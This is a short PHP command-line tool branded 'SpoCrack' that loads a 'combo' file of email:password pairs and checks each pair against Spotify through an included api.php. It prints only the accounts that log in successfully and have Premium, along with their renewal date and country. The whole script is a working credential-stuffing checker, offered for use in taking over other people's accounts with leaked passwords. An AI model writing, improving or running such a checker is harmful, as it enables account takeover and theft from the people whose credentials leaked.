<?php
//error_reporting(1);
include "api.php";
echo "\033[01;32m
  _________             _________                       __
 /   _____/_____   ____ \_   ___ \____________    ____ |  | __
 \_____  \\____ \ /  _ \/    \  \/\_  __ \__  \ _/ ___\|  |/ /
 /        \  |_> >  <_> )     \____|  | \// __ \\  \___|    <
/_______  /   __/ \____/ \______  /|__|  (____  /\___  >__|_ \
        \/|__|                  \/            \/     \/     \/
\033[0m\033[01;31m
#MD5\033[0m\n";
echo "\033[01;32mversion: 1.5\033[0m\n";
$ruta = readline("Combo: ");
echo
"\033[01;37m======================================\033[0m\n";
echo "\033[01;33mSolo saldran cuentas
funcionales, espere con calma. \033[0m\n";
echo
"\033[01;37m======================================\033[0m\n";
$oa = fopen($ruta, 'r');
while($a = fgetcsv($oa, 1000, ':')){
        $sp = new spotify();
        $result  = $sp->check($a[0], $a[1]);
        //echo $result;
        if (strpos($result, 'PREMIUM') == true){
        $info=json_decode($result, true);
        $i=0;
        foreach($info as $clave => $valor) {
        if($clave=="Validuntil"||$clave=="Country"){
          if($clave=="Validuntil"){
             $clave="renueva:";
          }
                //echo  $clave;
          if($clave=="Country"){
             $pais="Pais:";
          }
                $i++;
                if($i==1){
        echo "\033[01;32mCuenta: $a[0]:$a[1]|\033[0m";
}    
if($clave=="renueva:"||$clave=="Pais:"){
                        foreach($valor as $clave2=>$valor2) {
        echo "\033[01;32m$clave $valor2|\033[0m";
}
                        if($i==2){
                echo "\033[01;32mPREMIUM\033[0m\n";
}
        }
        }
        }
        }else {

}
}
        fclose($oa);
 ?>
